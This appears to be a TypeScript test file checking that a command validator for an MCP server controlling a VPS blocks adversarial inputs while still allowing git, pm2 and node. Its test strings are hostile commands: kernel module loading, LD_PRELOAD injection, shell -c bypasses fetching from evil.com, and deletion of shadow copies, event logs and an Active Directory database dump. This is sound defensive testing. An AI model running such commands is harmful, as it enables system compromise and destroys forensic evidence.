/**
 * bypass-corpus.test.ts — vps-control-mcp
 * Phase 1 (S60) adversarial bypass corpus: C5, C7, C8, C10.
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
// @ts-ignore
import { __TEST_ONLY } from '../tools.js';

const { validateCommand } = __TEST_ONLY;

function assertBlocked(cmd: string, label?: string): void {
  assert.throws(() => validateCommand(cmd), `Expected BLOCKED: ${label ?? cmd}`);
}

function assertAllowed(cmd: string, label?: string): void {
  assert.doesNotThrow(() => validateCommand(cmd), `Expected ALLOWED: ${label ?? cmd}`);
}

// ── C5: Kernel module operations ─────────────────────────────────────────
describe('C5: Kernel module operations', () => {
  it('blocks modprobe evil_mod', () => assertBlocked('modprobe evil_mod'));
  it('blocks insmod /tmp/evil.ko', () => assertBlocked('insmod /tmp/evil.ko'));
  it('blocks rmmod target_mod', () => assertBlocked('rmmod target_mod'));
  it('blocks depmod -a', () => assertBlocked('depmod -a'));
});

// ── C7: Dynamic-linker env-var injection ─────────────────────────────────
describe('C7: LD_PRELOAD / LD_AUDIT / LD_LIBRARY_PATH injection', () => {
  it('blocks LD_PRELOAD assignment', () => assertBlocked('LD_PRELOAD=/tmp/evil.so ls'));
  it('blocks export LD_PRELOAD', () => assertBlocked('export LD_PRELOAD=/tmp/hook.so'));
  it('blocks LD_AUDIT assignment', () => assertBlocked('LD_AUDIT=/tmp/audit.so ls'));
  it('blocks LD_LIBRARY_PATH manipulation', () => assertBlocked('LD_LIBRARY_PATH=/tmp/evil:$PATH ls'));
  it('blocks export LD_LIBRARY_PATH', () => assertBlocked('export LD_LIBRARY_PATH=/tmp/evil'));
});

// ── C8: Shell -c flag-injection bypass ───────────────────────────────────
describe('C8: Shell -c with flags before -c', () => {
  it('blocks bash -x -c "payload"', () => assertBlocked('bash -x -c "id"'));
  it('blocks sh --norc -c "payload"', () => assertBlocked('sh --norc -c "wget evil.com"'));
  it('blocks zsh -i -c "payload"', () => assertBlocked('zsh -i -c "id"'));
  it('blocks ksh -c "payload"', () => assertBlocked('ksh -c "id"'));
  it('blocks dash -e -c "payload"', () => assertBlocked('dash -e -c "whoami"'));
});

// ── C10: Anti-forensics / backup destruction ──────────────────────────────
describe('C10: Anti-forensics and backup destruction', () => {
  it('blocks vssadmin delete shadows', () => assertBlocked('vssadmin delete shadows /all /quiet'));
  it('blocks wbadmin delete catalog', () => assertBlocked('wbadmin delete catalog -quiet'));
  it('blocks wevtutil cl Security', () => assertBlocked('wevtutil cl Security'));
  it('blocks ntdsutil snapshot', () => assertBlocked('ntdsutil "ac i ntds" "ifm" q q'));
});

// ── Sanity: safe commands not blocked ─────────────────────────────────────
describe('Sanity: safe commands still allowed', () => {
  it('allows git log', () => assertAllowed('git log --oneline -10'));
  it('allows pm2 list', () => assertAllowed('pm2 list'));
  it('allows node --version', () => assertAllowed('node --version'));
});
